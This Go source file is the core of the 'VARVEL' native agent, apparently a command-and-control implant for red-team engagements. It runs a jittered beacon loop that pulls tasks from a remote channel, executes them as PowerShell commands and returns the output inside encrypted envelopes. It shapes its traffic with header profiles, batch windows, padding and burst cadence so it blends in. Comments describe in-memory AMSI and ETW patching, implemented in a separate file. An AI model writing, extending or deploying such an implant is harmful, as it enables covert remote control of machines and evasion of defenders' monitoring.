// agent.go — the VARVEL native agent core: strictly-increasing agent-global seq,
// jittered pull/exec/push loop, and the minimal honest task set (note / echo / shell).
//
// HONEST SCOPE (inherited from the sim agent's contract, narrowed deliberately):
//   · note  — record + echo ("noted: <data>"), same as the sim agent.
//   · echo  — return <data> verbatim (a pure wire round-trip probe; no host effect).
//   · shell — run <data> as a PowerShell child (powershell.exe -NoProfile
//             -NonInteractive -Command), cwd-confined to the agent's sandbox dir,
//             20s timeout, 60KB combined-output cap (the sim agent's numbers). The sim
//             agent runs 'shell' through cmd.exe (spawn shell:true); THIS agent's shell
//             is a PowerShell child — the same governed blast radius, a different host
//             interpreter. That difference is documented in docs/NATIVE.md, not hidden.
//   · evasion-enable / evasion-restore / evasion-status — the EVASION INTERNALS
//     TIER ported to native (evasion_windows.go): own-process in-memory patches of
//     amsi.dll!AmsiScanBuffer / ntdll.dll!EtwEventWrite, snapshot-first, patch-
//     VERIFIED (byte re-read + the official AMSI test-string flip; ETW additionally
//     gets an in-process noop-call probe), restorable with re-verify. DOUBLE-GATED
//     exactly like the PS/sim tiers: the channel refuses to queue unless the
//     engagement enabled exec.evasion, and THIS agent refuses unless launched with
//     -allow-evasion (the DLL config's "allowEvasion"). The result body is the SAME
//     op-first evidence JSON the PS host emits — engine/evasion.mjs
//     parseEvasionEvidence parses it UNCHANGED.
//   Unknown kinds answer "unknown task kind: <kind>" exactly like the sim agent —
//   a loud string, never a silent drop.
//   fetch/stage/link/socks/inline/persist kinds are NOT implemented in this
//   tier (they arrive as 'unknown task kind' — honest, audible, no pretending).
package main

import (
	"context"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

const (
	resultCapBytes = 60000          // sim-agent parity: combined output cap
	execTimeout    = 20 * time.Second // sim-agent parity: spawn timeout
	minGapMs       = 200            // sim-agent parity: never tighter than 200ms
)

// Agent speaks the http channel wire: pull tasks, execute, push results.
type Agent struct {
	URL      string // channel base, e.g. http://127.0.0.1:8971 (https:// engages the TLS profile)
	ID       string
	Token    string
	Dir      string // sandbox dir: shell cwd, the whole host-side blast radius
	Interval time.Duration
	Jitter   time.Duration
	Client   *http.Client
	Logf     func(format string, args ...any) // nil -> stderr via log.Printf
	// Envelope encryption (engine/envelope.mjs, ported in envelope.go), AGENT half —
	// sim-agent --enc parity: seal every result body end-to-end, advertise ec:1
	// (x-varvel-enc: 1) on every pull, and REQUIRE sealed task replies — a plaintext
	// reply is a downgrade, loud and never tasked from. The channel's enc.mode gates
	// the listener half; both halves fail loud.
	Enc bool
	// SHAPING PACK (engine/malleable.mjs v2, ported in shape.go): the adopted wire
	// shape — path templates, ORDERED header set, cadence model, batch/dwell windows,
	// padding. Shape==nil is 'plain' (today's byte-identical minimal wire). Adopted
	// from the channel-delivered x-varvel-shape reply header (sim-agent parity), or
	// from the launch-time -shape flag; a channel delivery re-anchors live. ShapeAt
	// anchors the batch-window schedule BOTH sides derive independently from the
	// shared token (windowFlushAt) — no coordination channel needed.
	Shape   *ShapeProfile
	ShapeAt int64
	// TLSProfile/TLSInsecure are the launch dial config — the ordered emitter's https
	// leg needs them (shapehttp.go dials itself; the plain leg's client already
	// carries them).
	TLSProfile  string
	TLSInsecure bool
	// Rand is the injectable sampler (path/UA picks, cadence jitter, bursts) —
	// nil -> math/rand.Float64. Tests inject determinism.
	Rand func() float64
	// AllowEvasion is the agent-side half of the EVASION tier's double gate (default
	// OFF): kinds evasion-enable / evasion-restore / evasion-status patch THIS agent's
	// OWN process memory (evasion_windows.go) only when this is set AND the channel
	// queued the task under an engagement with exec.evasion on. Off → every evasion-*
	// kind answers a loud REFUSED text and nothing is patched, ever.
	AllowEvasion bool

	seq     int64
	encKey  []byte // lazily derived (HKDF from token+id), cached
	running bool
}

// randFn returns the configured sampler or the default source.
func (a *Agent) randFn() func() float64 {
	if a.Rand != nil {
		return a.Rand
	}
	return rand.Float64
}

// shapeWire bundles the shaping state wire.go needs per request (nil shape fields
// mean the plain minimal wire — today's byte-identical requests).
func (a *Agent) shapeWire() *shapeWireCtx {
	return &shapeWireCtx{shape: a.Shape, randFn: a.randFn(), tlsProf: a.TLSProfile, tlsInsec: a.TLSInsecure}
}

// adoptShapeHeader consumes the channel-delivered x-varvel-shape reply header
// (sim-agent _adoptConfigHeaders parity): 'plain' (or a block-less payload) clears
// back to today's wire; a real payload resolves + adopts; a malformed one is ignored
// (the current shape stays). Adoption is noted once per change, never per reply.
func (a *Agent) adoptShapeHeader(h http.Header) {
	if h == nil {
		return
	}
	v := h.Get("x-varvel-shape")
	if v == "" {
		return
	}
	shape, at, ok := resolveShapePayload(v)
	if !ok {
		return
	}
	if shape == nil {
		if a.Shape != nil {
			a.note("shape cleared: plain (today's wire)")
		}
		a.Shape = nil
		a.ShapeAt = 0
		return
	}
	if a.Shape == nil || a.Shape.Name != shape.Name {
		extra := ""
		if shape.Batch != nil {
			extra += fmt.Sprintf(" (batch window %dms)", shape.Batch.WindowMs)
		}
		if shape.Padding != nil {
			extra += fmt.Sprintf(" (padding x%d)", shape.Padding.PerCycle)
		}
		a.note("shape adopted: %s%s", shape.Name, extra)
	}
	a.Shape = shape
	if at != 0 {
		a.ShapeAt = at
	} else if a.ShapeAt == 0 {
		a.ShapeAt = time.Now().UnixMilli()
	}
}

// key returns the cached envelope key, deriving it on first use (HKDF from MY token —
// the listener derives the same from the stored credential; a relay parent's
// 'varvel-link:' keys can never reach this domain).
func (a *Agent) key() ([]byte, error) {
	if a.encKey == nil {
		k, err := deriveEncKey(a.Token, a.ID)
		if err != nil {
			return nil, err
		}
		a.encKey = k
	}
	return a.encKey, nil
}

func (a *Agent) note(format string, args ...any) {
	if a.Logf != nil {
		a.Logf(format, args...)
		return
	}
	log.Printf(format, args...)
}

// nextSeq advances the agent-global sequence. ONE counter serves pulls and pushes —
// the listener rejects seq <= lastSeen on either route (sim-agent parity: this.seq++
// per request, never per route).
func (a *Agent) nextSeq() int64 {
	a.seq++
	return a.seq
}

// tick runs one pull/exec/push cycle. Reports whether any task was delivered.
func (a *Agent) tick(ctx context.Context) (bool, error) {
	var encKey []byte
	if a.Enc {
		k, err := a.key()
		if err != nil {
			return false, err
		}
		encKey = k
	}
	tasks, hdr, err := pull(a.Client, a.URL, a.ID, a.Token, a.nextSeq(), a.Enc, encKey, a.shapeWire())
	if hdr != nil {
		a.adoptShapeHeader(hdr) // the x-varvel-shape delivery rides 204s and 200s alike
	}
	if err != nil {
		// Envelope-layer refusals are LOUD but not transport failures: the cycle
		// continues, the reply is never tasked from (sim-agent parity, verbatim notes).
		if errors.Is(err, errPlaintextReply) {
			a.note("%v", err)
			return false, nil
		}
		var ee *EnvelopeError
		if errors.As(err, &ee) {
			a.note("enc: sealed task reply failed to open (%s) — dropped", ee.Code)
			return false, nil
		}
		return false, err
	}
	for _, t := range tasks {
		a.note("task %s: %.60s", t.Kind, t.Data)
		result := a.exec(ctx, t)
		if err := push(a.Client, a.URL, a.ID, a.Token, a.nextSeq(), t.TaskID, result, a.Enc, encKey, a.shapeWire()); err != nil {
			return true, err
		}
		a.note("result sent (%db)", len(result))
	}
	return len(tasks) > 0, nil
}

// exec runs one task inside the sandbox blast radius. Every path returns a result
// string — a failing task still answers its taskId (the channel correlates results;
// silence would leave the ledger stuck at 'delivered').
func (a *Agent) exec(ctx context.Context, t Task) []byte {
	switch t.Kind {
	case "note":
		a.note("note: %s", t.Data)
		return []byte("noted: " + t.Data)
	case "echo":
		return []byte(t.Data)
	case "shell":
		return a.execShell(ctx, t.Data)
	case "evasion-enable", "evasion-restore", "evasion-status":
		return a.execEvasion(t.Kind, t.Data)
	default:
		return []byte("unknown task kind: " + t.Kind)
	}
}

// execShell runs the task data as ONE PowerShell child, cwd-locked to the sandbox.
// Combined stdout+stderr, capped at resultCapBytes, killed at execTimeout — the sim
// agent's exact containment numbers.
func (a *Agent) execShell(ctx context.Context, command string) []byte {
	cctx, cancel := context.WithTimeout(ctx, execTimeout)
	defer cancel()
	cmd := exec.CommandContext(cctx, "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", command)
	cmd.Dir = a.Dir
	hideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if cctx.Err() == context.DeadlineExceeded {
		return []byte("(task timeout)")
	}
	out = truncate(out, resultCapBytes)
	if err != nil {
		if len(out) == 0 {
			return []byte("ERROR: " + err.Error())
		}
		return out // a non-zero exit with output is still the honest result (sim-agent parity)
	}
	trimmed := trimSpaceRight(out)
	if len(trimmed) == 0 {
		return []byte("(no output)")
	}
	return trimmed
}

func truncate(b []byte, cap int) []byte {
	if len(b) <= cap {
		return b
	}
	return b[:cap]
}

func trimSpaceRight(b []byte) []byte {
	for len(b) > 0 && (b[len(b)-1] == ' ' || b[len(b)-1] == '\t' || b[len(b)-1] == '\r' || b[len(b)-1] == '\n') {
		b = b[:len(b)-1]
	}
	return b
}

// padCycle emits one padding dummy (wire.go pad), loudly noting failures — a pad
// error never breaks the loop (sim-agent parity: 'pad error: …' note, cycle on).
func (a *Agent) padCycle(ctx context.Context) {
	var encKey []byte
	if a.Enc {
		k, err := a.key()
		if err != nil {
			a.note("pad error: %v", err)
			return
		}
		encKey = k
	}
	_ = encKey // pad carries the capability header only; no body is sealed
	if err := pad(a.Client, a.URL, a.ID, a.Token, a.nextSeq(), a.Enc, a.shapeWire()); err != nil {
		a.note("pad error: %v", err)
	}
}

// sleepCtx sleeps ms milliseconds, waking early on ctx cancel. Returns false when
// the ctx ended the wait (the loop should stop).
func sleepCtx(ctx context.Context, ms int64) bool {
	if ms < 0 {
		ms = 0
	}
	select {
	case <-ctx.Done():
		return false
	case <-time.After(time.Duration(ms) * time.Millisecond):
		return true
	}
}

// batchDwellTarget computes the flush point the batch loop dwells to (extracted for
// the pinned-vector tests): THIS window's seeded flush if it is still ahead, else the
// NEXT window's — a window is never skipped (sim-agent run() parity, and the same
// windowFlushAt the channel derives from the shared token).
func (a *Agent) batchDwellTarget(nowMs int64) int64 {
	wMs := a.Shape.Batch.WindowMs
	anchor := a.ShapeAt
	if anchor == 0 {
		anchor = nowMs
	}
	i := windowIndexAt(anchor, wMs, nowMs)
	target := windowFlushAt(a.Token, anchor, wMs, i)
	if target <= nowMs {
		target = windowFlushAt(a.Token, anchor, wMs, i+1)
	}
	return target
}

// run is the beacon loop: tick, then wait out the cycle's gap. Cadence precedence
// (sim-agent run() parity): an adopted shape's BATCH window dwells to the seeded
// flush point both sides derive from the token (windowFlushAt — one cycle per
// window, the held-task burst lands exactly on it); else the shape's cadence model
// (proportional jitter + bursts); else the launch-time interval±jitter. When the
// shape arms PADDING, perCycle-1 dummy envelopes spread across the gap so busy and
// idle windows emit the same number of same-shaped requests. once = a single cycle.
func (a *Agent) run(ctx context.Context, once bool) {
	a.running = true
	for a.running {
		select {
		case <-ctx.Done():
			return
		default:
		}
		if _, err := a.tick(ctx); err != nil {
			a.note("tick error: %v", err)
		}
		if once {
			return
		}
		// BATCH/DWELL windows take precedence (sim-agent run(): the batch branch
		// continues before any cadence/padding math — batch + padding never mix).
		if a.Shape != nil && a.Shape.Batch != nil {
			now := time.Now().UnixMilli()
			if !sleepCtx(ctx, maxI64(50, a.batchDwellTarget(now)-now)) {
				return
			}
			continue
		}
		var gapMs int64
		var burst int
		if a.Shape != nil && a.Shape.Cadence != nil {
			gapMs, burst = nextGap(a.Shape.Cadence, a.randFn())
		} else {
			gapMs = int64(a.Interval/time.Millisecond) + int64((a.randFn()()*2-1)*float64(a.Jitter/time.Millisecond))
			burst = 1
		}
		// PADDING (constant-rate, profile-gated, default OFF): the cycle's dummy
		// envelopes spread across the gap (sim-agent: pads at seg boundaries).
		pads := 0
		if a.Shape != nil && a.Shape.Padding != nil {
			pads = a.Shape.Padding.PerCycle - 1
		}
		if pads > 0 {
			seg := maxI64(minGapMs, gapMs) / int64(pads+1)
			for k := 0; k < pads && a.running; k++ {
				if !sleepCtx(ctx, seg) {
					return
				}
				a.padCycle(ctx)
			}
			if !sleepCtx(ctx, seg) {
				return
			}
		} else if !sleepCtx(ctx, maxI64(minGapMs, gapMs)) {
			return
		}
		if burst > 1 && a.running { // a burst of quick cycles (browser-tab behavior), then baseline
			for i := 1; i < burst && a.running; i++ {
				if _, err := a.tick(ctx); err != nil {
					a.note("burst tick error: %v", err)
				}
				if !sleepCtx(ctx, maxI64(150, gapMs)) {
					return
				}
			}
		}
	}
}

func (a *Agent) stop() { a.running = false }

// trimTrailingSlash / maxInt live HERE (not main.go) so the DLL form
// (-tags varveldll, which excludes main.go) shares them verbatim.
func trimTrailingSlash(s string) string {
	for len(s) > 0 && s[len(s)-1] == '/' {
		s = s[:len(s)-1]
	}
	return s
}

func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}

// defaultSandbox mirrors the sim agent's default (.sim-<id>): a per-agent dir under
// the launch cwd.
func defaultSandbox(id string) string {
	return filepath.Join(mustGetwd(), ".native-"+id)
}

func mustGetwd() string {
	wd, err := os.Getwd()
	if err != nil {
		return "."
	}
	return wd
}
